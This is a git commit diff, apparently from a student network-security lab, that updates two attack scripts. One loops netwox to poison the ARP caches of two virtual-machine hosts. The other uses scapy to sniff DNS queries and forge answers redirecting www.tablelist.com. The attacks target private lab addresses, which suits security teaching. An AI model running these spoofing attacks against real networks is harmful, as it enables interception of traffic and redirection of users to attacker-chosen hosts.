ef266a4a0986f2e45c0296b74b8418406ab02928
Andrew Barba <abarba.77@gmail.com>
2016-03-18 10:29:52 -0400

    s

--- project_2/task2/poison.sh
+++ project_2/task2/poison.sh
@@ -2,7 +2,7 @@
 
 while true
 do
-	sudo netwox 72 -i 192.168.56.102 -E 08:00:27:a0:de:87 -I 192.168.56.101 -d eth14
-	sudo netwox 72 -i 192.168.56.101 -E 08:00:27:a0:de:87 -I 192.168.56.102 -d eth14
+	sudo netwox 72 -i 192.168.56.103 -E 08:00:27:a0:de:87 -I 192.168.56.104 -d eth14
+	sudo netwox 72 -i 192.168.56.104 -E 08:00:27:a0:de:87 -I 192.168.56.103 -d eth14
 	sleep 1
 done
--- project_2/task3/spoof.py
+++ project_2/task3/spoof.py
@@ -6,10 +6,10 @@ from scapy.all import *
 import time
 
 sniff(
-    filter="udp port 53 and ip src 192.168.56.101 and ip dst not 192.168.56.102",
+    filter="udp port 53 and ip src 192.168.56.103 and ip dst 192.168.56.104",
     prn=lambda p:
         send(
             IP(dst=p[IP].src, src=p[IP].dst)\
             /UDP(dport=p[UDP].sport, sport=p[UDP].dport)\
-            /DNS(id=p[DNS].id, an=DNSRR(rrname="www.tablelist.com", rdata="1.2.3.4", ttl=600))
+            /DNS(id=p[DNS].id, qr=1, an=DNSRR(rrname="www.tablelist.com", type="A", rclass="IN", rdata="1.2.3.4", ttl=600))
         ))
